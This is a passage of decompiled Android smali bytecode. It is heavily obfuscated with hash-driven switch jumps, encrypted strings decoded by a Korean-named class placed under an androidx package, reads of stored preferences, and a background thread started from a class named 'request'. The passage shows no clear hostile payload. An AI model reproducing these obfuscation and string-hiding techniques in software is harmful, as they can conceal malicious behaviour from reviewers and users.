    const-string v1, "\u06d7\u06d7\u06e8\u06e7\u06df\u06e4\u06db\u06e5\u06e1\u06d8\u06e7\u06d6\u06e2\u06e5\u06d8\u06df\u06e8\u06d8\u06dc\u06d8\u06d8\u06e1\u06d8\u06ec\u06e8\u06e5\u06da\u06e2\u06d6\u06d8\u06d7\u06d9\u06e8\u06eb\u06e8\u06e4\u06da\u06eb\u06dc\u06d8\u06eb\u06e6\u06e7\u06d8\u06da\u06da\u06d6\u06eb\u06db\u06dc\u06e1\u06e5\u06d6\u06e5\u06d7\u06e2\u06d6\u06d7\u06dc\u06d8"

    move-object/from16 v3, v22

    goto/16 :goto_0

    :sswitch_29
    const/4 v1, 0x0

    new-array v2, v1, [Ljava/lang/String;

    const-string v1, "\u06e7\u06e7\u06da\u06d7\u06d6\u06dc\u06e6\u06d8\u06e6\u06e4\u06e1\u06d8\u06e0\u06e2\u06e0\u06e1\u06e2\u06d9\u06e2\u06e0\u06ec\u06eb\u06d6\u06d8\u06eb\u06df\u06df\u06dc\u06e7\u06e1\u06d8"

    move-object/from16 v21, v2

    goto/16 :goto_0

    :sswitch_2a
    const-string v1, "\u06d7\u06e5\u06e8\u06d8\u06e7\u06d7\u06e8\u06d8\u06e0\u06e8\u06d6\u06e0\u06dc\u06e7\u06d7\u06e8\u06e8\u06d8\u06e5\u06d7\u06e4\u06eb\u06e5\u06da\u06d7\u06e7\u06e6\u06e6\u06df\u06e5\u06e0\u06d8\u06da\u06e5\u06e6\u06e1\u06e4\u06d6\u06d9\u06db\u06e6\u06db\u06ec\u06d7\u06e6\u06d6\u06db\u06d6\u06db\u06db\u06e5\u06e4\u06e5\u06e4\u06da\u06e1\u06d8"

    move-object/from16 v3, v21

    goto/16 :goto_0

    :sswitch_2b
    const-string v1, "ng4D3RxaoQ==\n"

    const-string v2, "+mFuvHU00kM=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v1, "\u06e1\u06ec\u06e0\u06e1\u06df\u06d6\u06e7\u06e7\u06d6\u06d7\u06df\u06dc\u06e2\u06db\u06e5\u06e4\u06da\u06d9\u06e0\u06da\u06e0\u06e4\u06eb\u06e0\u06e7\u06e6\u06da\u06e8\u06e2\u06e6\u06d8"

    move-object/from16 v20, v2

    goto/16 :goto_0

    :sswitch_2c
    const-string v1, "04NKSg==\n"

    const-string v2, "o+w5Pm9S+GI=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v1, "\u06e1\u06ec\u06d8\u06d8\u06d7\u06e5\u06d8\u06d8\u06d9\u06d6\u06e4\u06e4\u06d7\u06da\u06e4\u06df\u06ec\u06e8\u06d8\u06eb\u06da\u06d7\u06da\u06e8\u06e7\u06e4\u06e6\u06d8\u06d8\u06d7\u06d6\u06db\u06da\u06ec\u06ec\u06df\u06db\u06dc\u06d9\u06db\u06d6\u06d8\u06e1\u06db\u06db\u06d8\u06da\u06e1\u06d8\u06db\u06ec\u06e0"

    move-object/from16 v19, v2

    goto/16 :goto_0

    :sswitch_2d
    const/4 v1, 0x2

    new-array v8, v1, [Ljava/lang/String;

    const-string v1, "\u06d7\u06e1\u06eb\u06e1\u06df\u06e8\u06d8\u06d6\u06d6\u06e5\u06d8\u06e1\u06db\u06d6\u06d8\u06e7\u06ec\u06e7\u06d9\u06db\u06e5\u06e7\u06e6\u06e2\u06e8\u06dc\u06eb\u06d7\u06e6\u06e1\u06e0\u06d9\u06e4\u06e6\u06da\u06d9\u06db\u06e4"

    goto/16 :goto_0

    :sswitch_2e
    const/4 v1, 0x0

    aput-object v20, v8, v1

    const-string v1, "\u06d8\u06eb\u06e8\u06e1\u06e5\u06e6\u06d8\u06e7\u06e1\u06e0\u06df\u06ec\u06e4\u06e1\u06e6\u06dc\u06e0\u06db\u06eb\u06da\u06da\u06e6\u06df\u06eb\u06e2\u06d7\u06da\u06dc\u06e7\u06e6\u06e6\u06dc\u06ec\u06e2\u06df\u06ec"

    goto/16 :goto_0

    :sswitch_2f
    const/4 v1, 0x1

    aput-object v19, v8, v1

    const-string v1, "\u06e6\u06eb\u06eb\u06e6\u06e0\u06d7\u06ec\u06ec\u06e1\u06db\u06e6\u06db\u06e5\u06e2\u06dc\u06d8\u06e6\u06e1\u06d8\u06d8\u06e1\u06d7\u06ec\u06d7\u06e0\u06e6\u06d8\u06e0\u06ec\u06e6\u06e5\u06db\u06e1\u06e1\u06db\u06e6\u06e4\u06eb"

    goto/16 :goto_0

    :sswitch_30
    const/4 v1, 0x0

    aget-object v2, v8, v1

    const-string v1, "\u06dc\u06e0\u06e8\u06d8\u06e1\u06db\u06e5\u06e6\u06e4\u06d8\u06d8\u06df\u06e2\u06da\u06d8\u06d7\u06e2\u06e0\u06e7\u06e8\u06d8\u06ec\u06d8\u06e1\u06d8\u06e5\u06d6\u06d8\u06db\u06d8\u06d6\u06eb\u06df\u06e1\u06d8\u06eb\u06e4\u06e2\u06dc\u06db\u06e1\u06d8\u06da\u06e8\u06e5\u06e1\u06eb\u06e8\u06e2\u06e2\u06dc\u06e7\u06e0\u06e6\u06eb\u06e1\u06ec\u06df\u06e1\u06d8"

    move-object/from16 v18, v2

    goto/16 :goto_0

    :sswitch_31
    const-string v1, "RZTNMaRY1Q==\n"

    const-string v2, "IfugUM02plA=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v1, "\u06e0\u06d8\u06e0\u06ec\u06d8\u06e5\u06d8\u06e8\u06d8\u06d8\u06e5\u06dc\u06e6\u06d8\u06da\u06e4\u06da\u06d7\u06e0\u06d7\u06ec\u06e1\u06d6\u06e1\u06df\u06e5\u06e2\u06e0\u06df\u06eb\u06ec\u06eb\u06da\u06e4\u06eb\u06eb\u06e6\u06d6\u06d8\u06db\u06ec\u06ec\u06eb\u06e7\u06e7\u06e2\u06eb\u06e8\u06d8\u06da\u06e2\u06e0"

    move-object/from16 v17, v2

    goto/16 :goto_0

    :sswitch_32
    const-string v1, "\u06e5\u06ec\u06d9\u06e0\u06da\u06e4\u06e1\u06da\u06e6\u06d8\u06e0\u06e0\u06e5\u06d8\u06e5\u06d7\u06eb\u06e6\u06eb\u06db\u06df\u06e5\u06e1\u06d9\u06d8\u06e7\u06d8\u06e2\u06e1\u06d7\u06dc\u06e2\u06e1\u06d8\u06da\u06d6\u06dc\u06d8\u06ec\u06df\u06e6\u06db\u06df\u06e2\u06db\u06e8\u06d7"

    move/from16 v15, v16

    goto/16 :goto_0

    :sswitch_33
    const v2, -0x59fa4e6c

    const-string v1, "\u06dc\u06da\u06ec\u06d9\u06e6\u06e4\u06d6\u06db\u06eb\u06e1\u06e7\u06e4\u06e0\u06e4\u06e8\u06d8\u06e0\u06e6\u06e1\u06d8\u06e7\u06e5\u06eb\u06d7\u06d8\u06d6\u06d8\u06e7\u06e8\u06d6\u06d6\u06e4\u06e0\u06d7\u06d7\u06e1\u06e6\u06e5\u06dc\u06e1\u06e0\u06eb\u06d8\u06e6\u06e5\u06d8\u06d7\u06e4\u06dc\u06d8\u06da\u06e0\u06e8\u06d8\u06d6\u06e8\u06d8\u06e0\u06d9\u06d6"

    :goto_9
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_9

    goto :goto_9

    :sswitch_34
    const v4, -0x23d9ba0a

    const-string v1, "\u06e5\u06da\u06e2\u06eb\u06e7\u06e6\u06eb\u06db\u06e6\u06d8\u06e4\u06eb\u06d6\u06e5\u06e1\u06ec\u06e2\u06d6\u06e2\u06da\u06e7\u06e6\u06d9\u06e6\u06dc\u06df\u06e6\u06d8\u06d6\u06d8\u06e5\u06d8\u06d9\u06e2\u06e7\u06e0\u06d8\u06e6\u06d8"

    :goto_a
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_a

    goto :goto_a

    :sswitch_35
    const-string v1, "\u06e0\u06eb\u06e6\u06d8\u06e6\u06e4\u06eb\u06dc\u06dc\u06d8\u06e4\u06da\u06d6\u06d8\u06e4\u06d6\u06e1\u06d8\u06e0\u06e4\u06db\u06db\u06dc\u06e5\u06d6\u06e5\u06e8\u06e6\u06d8\u06d8\u06eb\u06e5\u06d6\u06d8\u06e1\u06d9\u06e8\u06db\u06d8\u06d8\u06d8\u06ec\u06e1\u06e6\u06d8\u06d9\u06e2\u06dc\u06d8\u06e2\u06d9\u06ec\u06d6\u06e5\u06e6\u06e5\u06db\u06d7\u06e8\u06eb\u06d6"

    goto :goto_9

    :cond_4
    const-string v1, "\u06d9\u06da\u06d8\u06d8\u06e7\u06d8\u06e2\u06d7\u06da\u06e0\u06d6\u06ec\u06e0\u06ec\u06e1\u06d9\u06d9\u06ec\u06db\u06eb\u06e4\u06eb\u06df\u06e6\u06d9\u06ec\u06e4\u06e0\u06d7\u06d8\u06d8\u06d8\u06e4\u06eb\u06d6\u06d8\u06db\u06e0\u06e8\u06d8\u06d8\u06e2\u06e4\u06e4\u06e6\u06df\u06e1\u06db\u06e1\u06d7\u06d6\u06e0"

    goto :goto_a

    :sswitch_36
    sget-object v1, Landroidx/base/저장;->e:Ljava/lang/String;

    move-object/from16 v0, v17

    invoke-interface {v7, v1, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    move-object/from16 v0, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const-string v1, "\u06e7\u06e2\u06da\u06eb\u06d6\u06e4\u06e8\u06e8\u06dc\u06e2\u06d7\u06e8\u06d7\u06d8\u06d6\u06e7\u06d6\u06d7\u06df\u06e1\u06e5\u06ec\u06e1\u06d8\u06d9\u06eb\u06e8\u06d7\u06d7\u06e8\u06e7\u06da\u06dc\u06d8\u06e5\u06d8\u06e5\u06d8\u06ec\u06e5\u06d9\u06e7\u06da\u06e8\u06e4\u06e5\u06d8\u06e2\u06dc\u06d7"

    goto :goto_a

    :sswitch_37
    const-string v1, "\u06e1\u06eb\u06e7\u06d7\u06d9\u06e8\u06e6\u06ec\u06d7\u06da\u06db\u06d7\u06d9\u06db\u06eb\u06d7\u06eb\u06df\u06ec\u06e7\u06e4\u06e1\u06e0\u06e8\u06d8\u06d8\u06d6\u06d6\u06d8\u06da\u06d7\u06d8\u06d6\u06d7\u06e5\u06eb\u06e6\u06e8\u06d8\u06d8\u06df\u06e7\u06e1\u06da\u06d6\u06e2\u06df\u06da\u06dc\u06d6"

    goto :goto_a

    :sswitch_38
    const-string v1, "\u06da\u06e2\u06d9\u06da\u06ec\u06da\u06e2\u06e7\u06e1\u06d8\u06e8\u06e8\u06d6\u06e2\u06d8\u06d6\u06d8\u06d6\u06d8\u06d6\u06ec\u06da\u06e5\u06d8\u06db\u06ec\u06dc\u06d8\u06d8\u06d6\u06d8\u06d7\u06d8\u06d8"

    goto :goto_9

    :sswitch_39
    const-string v1, "\u06e6\u06d8\u06e0\u06da\u06e8\u06e6\u06d8\u06df\u06eb\u06e5\u06d8\u06e5\u06e6\u06e5\u06e4\u06e6\u06e5\u06d8\u06d6\u06e1\u06e0\u06da\u06e0\u06ec\u06e1\u06d9\u06ec\u06eb\u06dc\u06db\u06e1\u06ec\u06e7"

    goto :goto_9

    :sswitch_3a
    const-string v1, "\u06df\u06d6\u06d9\u06e5\u06e0\u06d8\u06db\u06d6\u06e7\u06ec\u06e2\u06e5\u06e2\u06d7\u06e5\u06e2\u06dc\u06d8\u06e7\u06db\u06d7\u06d9\u06e7\u06e0\u06e0\u06db\u06e5\u06d8\u06ec\u06ec\u06e6\u06db\u06db\u06e4\u06e5\u06ec\u06da"

    goto/16 :goto_0

    :sswitch_3b
    const-string v1, "\u06d9\u06d6\u06e1\u06d8\u06e0\u06eb\u06db\u06e0\u06e4\u06e2\u06d6\u06d7\u06d7\u06e8\u06e1\u06e7\u06d7\u06e0\u06d9\u06db\u06e8\u06d8\u06df\u06e2\u06e8\u06d8\u06db\u06db\u06da\u06e8\u06e7\u06d8"

    move/from16 v15, v16

    goto/16 :goto_0

    :sswitch_3c
    const v2, -0x587c856c

    const-string v1, "\u06eb\u06e2\u06dc\u06e4\u06db\u06dc\u06db\u06e8\u06e7\u06ec\u06da\u06e4\u06e4\u06db\u06e6\u06d7\u06e4\u06e6\u06e6\u06e2\u06dc\u06db\u06e8\u06db\u06dc\u06e5\u06e8\u06d8\u06e1\u06df\u06e6\u06d8"

    :goto_b
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v2

    sparse-switch v4, :sswitch_data_b

    goto :goto_b

    :sswitch_3d
    const-string v1, "\u06e8\u06e6\u06ec\u06eb\u06e7\u06e4\u06ec\u06da\u06e2\u06d8\u06dc\u06db\u06d9\u06e5\u06e5\u06d8\u06da\u06d9\u06da\u06dc\u06e7\u06db\u06df\u06da\u06dc\u06d8\u06d8\u06e7\u06d6\u06eb\u06e4\u06d7\u06e5\u06e4\u06e8\u06d8\u06e2\u06dc\u06d7"

    goto/16 :goto_0

    :sswitch_3e
    const-string v1, "\u06d9\u06df\u06e0\u06e6\u06e1\u06e1\u06e5\u06e8\u06d8\u06ec\u06da\u06df\u06d9\u06df\u06e0\u06e0\u06eb\u06e4\u06d6\u06d8\u06d8\u06e4\u06e2\u06d8\u06d8\u06e0\u06e4\u06e4\u06ec\u06e6\u06e8\u06d8\u06e0\u06e8\u06d8\u06d6\u06e5\u06d8\u06d8\u06d7\u06eb\u06d7\u06ec\u06e0\u06d7\u06e0\u06d9\u06e1\u06d9\u06e4\u06e5\u06e8\u06e7\u06d8\u06e6\u06e7\u06d8"

    goto :goto_b

    :sswitch_3f
    const v4, -0x707b0fbb

    const-string v1, "\u06ec\u06ec\u06d9\u06e1\u06d9\u06e8\u06d9\u06df\u06dc\u06dc\u06df\u06d8\u06d8\u06e7\u06eb\u06e6\u06d8\u06d8\u06d8\u06e5\u06d8\u06d9\u06df\u06e0\u06da\u06e6\u06e0\u06e1\u06e5\u06df\u06df\u06d8\u06e8\u06df\u06ec\u06df\u06da\u06e2\u06e6\u06e2\u06e6\u06d8\u06df\u06e8\u06d6\u06eb\u06e7\u06e0\u06d6\u06d9\u06d8\u06d8"

    :goto_c
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_c

    goto :goto_c

    :sswitch_40
    const-string v1, "\u06ec\u06e0\u06db\u06e2\u06e6\u06e5\u06eb\u06eb\u06dc\u06d8\u06e2\u06e2\u06dc\u06d8\u06db\u06df\u06e0\u06e6\u06e7\u06dc\u06d8\u06e0\u06e7\u06d6\u06d8\u06e0\u06d8\u06d6\u06d8\u06e1\u06e2\u06d7\u06df\u06e1\u06e6\u06e2\u06e8\u06df\u06d8\u06e8\u06d8\u06ec\u06da\u06e6\u06e5\u06e4\u06e6\u06d6\u06e0\u06e6\u06e5\u06d7\u06d8\u06d8"

    goto :goto_b

    :cond_5
    const-string v1, "\u06e5\u06e8\u06e8\u06d8\u06e4\u06ec\u06e1\u06d8\u06e4\u06df\u06d8\u06d8\u06dc\u06eb\u06d6\u06d8\u06d8\u06df\u06e2\u06e7\u06dc\u06e4\u06df\u06e4\u06dc\u06d8\u06e4\u06e1\u06eb\u06d7\u06eb\u06d6\u06e8\u06e8\u06eb\u06da\u06d7\u06d9\u06d6\u06d9\u06e6"

    goto :goto_c

    :sswitch_41
    if-nez v23, :cond_5

    const-string v1, "\u06e6\u06da\u06e4\u06e8\u06d9\u06db\u06e6\u06eb\u06d9\u06e7\u06e5\u06e0\u06e8\u06db\u06d8\u06d8\u06da\u06e4\u06db\u06d8\u06e4\u06d8\u06d8\u06d6\u06e1\u06e2\u06e4\u06e4\u06d6\u06dc\u06df\u06e8\u06e4\u06e8\u06e6\u06d8\u06ec\u06df\u06d6"

    goto :goto_c

    :sswitch_42
    const-string v1, "\u06e2\u06d8\u06e6\u06d8\u06df\u06e6\u06d6\u06d8\u06dc\u06e6\u06e8\u06dc\u06d6\u06d6\u06d8\u06e7\u06e2\u06df\u06eb\u06eb\u06da\u06ec\u06eb\u06df\u06d9\u06dc\u06e8\u06ec\u06da\u06e4\u06d9\u06e4\u06d7\u06e0\u06e2\u06d9\u06e7\u06da\u06da\u06e1\u06d8\u06e2\u06e7\u06db\u06da\u06eb\u06df\u06d7\u06eb\u06db"

    goto :goto_c

    :sswitch_43
    const-string v1, "\u06eb\u06e1\u06e5\u06db\u06dc\u06e1\u06d8\u06e8\u06db\u06df\u06e6\u06e1\u06d8\u06db\u06da\u06df\u06e4\u06e1\u06e0\u06d7\u06e7\u06ec\u06da\u06d7\u06d9\u06e4\u06e8\u06d6\u06e7\u06d8\u06e7\u06d8"

    goto :goto_b

    :sswitch_44
    const/4 v2, 0x0

    const-string v1, "\u06d8\u06db\u06e6\u06e5\u06eb\u06d7\u06df\u06d7\u06e4\u06d9\u06d7\u06d9\u06df\u06d8\u06d8\u06d7\u06e1\u06e5\u06d8\u06d8\u06e4\u06d9\u06e4\u06ec\u06e8\u06d8\u06eb\u06e2\u06e8\u06d8\u06e8\u06d6\u06e5\u06d8"

    move v14, v2

    goto/16 :goto_0

    :sswitch_45
    const-string v1, "\u06dc\u06df\u06e8\u06d8\u06db\u06e6\u06d6\u06d8\u06e6\u06e6\u06d8\u06dc\u06e4\u06ec\u06da\u06eb\u06eb\u06e2\u06e1\u06e8\u06d8\u06e5\u06e7\u06d6\u06df\u06e2\u06d7\u06e7\u06ec\u06eb\u06dc\u06db\u06d8\u06e5\u06df\u06e5\u06e6\u06e1\u06d9\u06e7\u06d6\u06e5\u06d8\u06d8"

    move v15, v14

    goto/16 :goto_0

    :sswitch_46
    sget-object v1, Landroidx/base/저장;->f:Ljava/lang/String;

    const/4 v2, 0x0

    invoke-interface {v7, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    const-string v1, "\u06df\u06e2\u06db\u06e2\u06da\u06d6\u06e7\u06df\u06df\u06d7\u06e4\u06dc\u06db\u06e2\u06eb\u06d6\u06e5\u06d8\u06e7\u06ec\u06e2\u06ec\u06d8\u06e4\u06d7\u06da\u06dc\u06d8\u06d7\u06ec\u06e6\u06d8\u06d6\u06e8\u06d6\u06d9\u06d9\u06e5\u06d8\u06d9\u06d7\u06eb\u06eb\u06e8\u06e7"

    move v13, v2

    goto/16 :goto_0

    :sswitch_47
    new-instance v24, Ljava/lang/Thread;

    new-instance v1, Landroidx/base/요청;

    const/4 v2, 0x1

    new-array v2, v2, [I

    const/4 v4, 0x0

    aput v15, v2, v4

    const/4 v4, 0x1

    new-array v4, v4, [I

    const/4 v5, 0x0

    aput v13, v4, v5

    const/4 v5, 0x1

    new-array v6, v5, [I

    const/4 v5, 0x0

    const/4 v9, 0x0

    aput v9, v6, v5

    const/4 v5, 0x1

    new-array v9, v5, [Z

    const/4 v5, 0x0

    const/4 v10, 0x0

    aput-boolean v10, v9, v5

    const/4 v5, 0x1

    new-array v10, v5, [Z

    const/4 v5, 0x0

    const/4 v11, 0x0

    aput-boolean v11, v10, v5

    xor-int/lit8 v11, v23, 0x1

    const/4 v5, 0x1

    new-array v12, v5, [I

    const/4 v5, 0x0

    const/16 v25, 0x0

    aput v25, v12, v5

    move-object/from16 v5, p0

    invoke-direct/range {v1 .. v12}, Landroidx/base/요청;-><init>([I[Ljava/lang/String;[ILandroid/content/Context;[ILandroid/content/SharedPreferences;[Ljava/lang/String;[Z[ZZ[I)V

    move-object/from16 v0, v24

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual/range {v24 .. v24}, Ljava/lang/Thread;->start()V

    const-string v1, "\u06db\u06da\u06e5\u06e0\u06e7\u06e1\u06db\u06d9\u06e6\u06d6\u06dc\u06d8\u06e6\u06e2\u06df\u06e1\u06e0\u06ec\u06d8\u06e8\u06d6\u06e4\u06e8\u06e0\u06e4\u06df\u06dc\u06d8\u06e8\u06e1\u06d6\u06dc\u06d8\u06e5\u06ec\u06e2\u06d7\u06db\u06db\u06e7\u06da\u06df\u06e6\u06d8\u06da\u06e4\u06d7\u06e6\u06db\u06e2"

    goto/16 :goto_0

    :sswitch_48
    const-string v1, "\u06e6\u06e5\u06e6\u06d6\u06e2\u06e2\u06e7\u06da\u06e0\u06e6\u06e2\u06d6\u06d8\u06d9\u06db\u06d6\u06e1\u06e0\u06e6\u06d8\u06d7\u06df\u06e2\u06da\u06e1\u06dc\u06ec\u06e6\u06e1\u06d9\u06eb\u06d8\u06d8"

    goto/16 :goto_0

    :sswitch_49
    const-string v1, "\u06d7\u06d7\u06e8\u06e7\u06df\u06e4\u06db\u06e5\u06e1\u06d8\u06e7\u06d6\u06e2\u06e5\u06d8\u06df\u06e8\u06d8\u06dc\u06d8\u06d8\u06e1\u06d8\u06ec\u06e8\u06e5\u06da\u06e2\u06d6\u06d8\u06d7\u06d9\u06e8\u06eb\u06e8\u06e4\u06da\u06eb\u06dc\u06d8\u06eb\u06e6\u06e7\u06d8\u06da\u06da\u06d6\u06eb\u06db\u06dc\u06e1\u06e5\u06d6\u06e5\u06d7\u06e2\u06d6\u06d7\u06dc\u06d8"

    goto/16 :goto_0

    :sswitch_4a
    const-string v1, "\u06e1\u06e6\u06eb\u06e2\u06d9\u06d9\u06e8\u06df\u06d8\u06da\u06e6\u06e6\u06d8\u06e2\u06e4\u06e7\u06dc\u06e1\u06e7\u06e5\u06ec\u06e7\u06d6\u06da\u06e1\u06d8\u06eb\u06e1\u06eb\u06eb\u06e8\u06d8\u06e0\u06da\u06e6\u06e4\u06e1\u06e5\u06d8"

    goto/16 :goto_0

    :sswitch_4b
    const-string v1, "\u06e0\u06d8\u06ec\u06e2\u06d6\u06df\u06dc\u06eb\u06d6\u06e6\u06e8\u06d8\u06e5\u06d7\u06da\u06e2\u06d7\u06df\u06e6\u06db\u06e5\u06e6\u06ec\u06e1\u06d8\u06da\u06e6\u06e0\u06e1\u06d7\u06d9\u06e0\u06e0\u06e1\u06e4\u06df\u06e1\u06d8"

    goto/16 :goto_0

    :sswitch_4c
    const-string v1, "\u06dc\u06df\u06e8\u06d8\u06db\u06e6\u06d6\u06d8\u06e6\u06e6\u06d8\u06dc\u06e4\u06ec\u06da\u06eb\u06eb\u06e2\u06e1\u06e8\u06d8\u06e5\u06e7\u06d6\u06df\u06e2\u06d7\u06e7\u06ec\u06eb\u06dc\u06db\u06d8\u06e5\u06df\u06e5\u06e6\u06e1\u06d9\u06e7\u06d6\u06e5\u06d8\u06d8"

    goto/16 :goto_0

    :sswitch_4d
    const-string v1, "\u06db\u06da\u06e5\u06e0\u06e7\u06e1\u06db\u06d9\u06e6\u06d6\u06dc\u06d8\u06e6\u06e2\u06df\u06e1\u06e0\u06ec\u06d8\u06e8\u06d6\u06e4\u06e8\u06e0\u06e4\u06df\u06dc\u06d8\u06e8\u06e1\u06d6\u06dc\u06d8\u06e5\u06ec\u06e2\u06d7\u06db\u06db\u06e7\u06da\u06df\u06e6\u06d8\u06da\u06e4\u06d7\u06e6\u06db\u06e2"

    goto/16 :goto_0

    :sswitch_4e
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x779706fc -> :sswitch_3
        -0x6daaee21 -> :sswitch_3b
        -0x64d9654d -> :sswitch_47
        -0x60705d60 -> :sswitch_46
        -0x5fe74c35 -> :sswitch_1f
        -0x5027ff7d -> :sswitch_28
        -0x4db1a332 -> :sswitch_0
        -0x4c3f5918 -> :sswitch_29
        -0x4b271844 -> :sswitch_44
        -0x48aa314c -> :sswitch_3c
        -0x39920e73 -> :sswitch_4e
        -0x34a4d223 -> :sswitch_1e
        -0x3406b5ea -> :sswitch_27
        -0x2b8f4dc7 -> :sswitch_33
        -0x2b817f3a -> :sswitch_1b
        -0x2a54328f -> :sswitch_2e
        -0x1b3ab4e5 -> :sswitch_32
        -0x146e948d -> :sswitch_2d
        -0xd55bced -> :sswitch_13
        -0x2283b71 -> :sswitch_1c
        0x57f9c79 -> :sswitch_2
        0x11cf11dd -> :sswitch_45
        0x16298fac -> :sswitch_2b
        0x1ba60f8b -> :sswitch_1
        0x2060d41e -> :sswitch_4d
        0x38a7a00f -> :sswitch_2c
        0x3eaff4ea -> :sswitch_4b
        0x4328dc7b -> :sswitch_b
        0x460f286c -> :sswitch_31
        0x4a4e77df -> :sswitch_2f
        0x4b39e218 -> :sswitch_30
        0x6067319f -> :sswitch_1d
        0x6abaebe5 -> :sswitch_49
        0x7ee1e819 -> :sswitch_2a
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x5fbcd0ae -> :sswitch_4d
        -0x23854561 -> :sswitch_4
        -0x21f0a4c -> :sswitch_9
        0x663f9f31 -> :sswitch_a
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x65b1da54 -> :sswitch_8
        -0x3ef4ade5 -> :sswitch_7
        0x63969e3 -> :sswitch_6
        0x1a7de640 -> :sswitch_5
    .end sparse-switch

    :sswitch_data_3
    .sparse-switch
        -0x6c905ae7 -> :sswitch_e
        0x37a7d3f3 -> :sswitch_c
        0x54d32894 -> :sswitch_12
        0x5c627f24 -> :sswitch_48
    .end sparse-switch

    :sswitch_data_4
    .sparse-switch
        -0x4f5b5447 -> :sswitch_f
        -0x109745ad -> :sswitch_d
        0x2d12b630 -> :sswitch_10
        0x5adaa060 -> :sswitch_11
    .end sparse-switch

    :sswitch_data_5
    .sparse-switch
        -0x4e18b4cf -> :sswitch_19
        -0x45f5ccb6 -> :sswitch_14
        -0x24462ba3 -> :sswitch_48
        0x1d9f3e71 -> :sswitch_1a
    .end sparse-switch

    :sswitch_data_6
    .sparse-switch
        -0x533ceef3 -> :sswitch_16
        -0x158f8975 -> :sswitch_15
        -0x67dcfae -> :sswitch_18
        0xf8992d1 -> :sswitch_17
    .end sparse-switch

    :sswitch_data_7
    .sparse-switch
        0x2e6d0eae -> :sswitch_26
        0x358b09ba -> :sswitch_4a
        0x3a7010fc -> :sswitch_20
        0x3fb48c87 -> :sswitch_25
    .end sparse-switch

    :sswitch_data_8
    .sparse-switch
        -0x61bca003 -> :sswitch_23
        -0x298279e6 -> :sswitch_21
        -0x1987437a -> :sswitch_24
        0x438cd712 -> :sswitch_22
    .end sparse-switch

    :sswitch_data_9
    .sparse-switch
        -0x6f0aef10 -> :sswitch_39
        -0x419c0926 -> :sswitch_4c
        0x733e4c7d -> :sswitch_3a
        0x73e7b598 -> :sswitch_34
    .end sparse-switch

    :sswitch_data_a
    .sparse-switch
        -0x7a22950 -> :sswitch_36
        -0x24688d8 -> :sswitch_38
        0xa46d55 -> :sswitch_35
        0x60f962f0 -> :sswitch_37
    .end sparse-switch

    :sswitch_data_b
    .sparse-switch
        -0x42943353 -> :sswitch_3d
        -0x1b872bba -> :sswitch_4c
        0x1d70bfe9 -> :sswitch_3f
        0x2f8d54ec -> :sswitch_43
    .end sparse-switch

    :sswitch_data_c
    .sparse-switch
        -0x7600fad4 -> :sswitch_41
        -0x4cb01032 -> :sswitch_3e
        -0x3b6d8534 -> :sswitch_42
        0xda6d40b -> :sswitch_40
    .end sparse-switch
.end method
